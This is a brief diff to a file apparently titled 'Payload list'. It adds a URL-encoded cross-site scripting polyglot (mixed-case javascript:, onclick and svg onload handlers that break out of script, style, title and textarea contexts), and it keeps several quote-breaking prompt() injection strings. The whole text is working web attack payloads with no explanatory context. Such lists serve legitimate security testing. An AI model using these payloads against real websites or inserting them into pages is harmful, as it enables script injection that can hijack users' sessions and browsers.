@@ -1,5 +1,5 @@
 Payload list
-
+jaVasCript:/*-/*%60/*%5C%60/*'/*%22/**/(/*%20*/oNcliCk=alert()%20)//%250D%250A%250D%250A//%3C/stYle/%3C/titLe/%3C/teXtarEa/%3C/scRipt/--!%3E%5Cx3csVg/%3CsVg/oNloAd=alert()//%3E%5Cx3e
 "-prompt(8)-"
 '-prompt(8)-'
 ";a=prompt,a()//
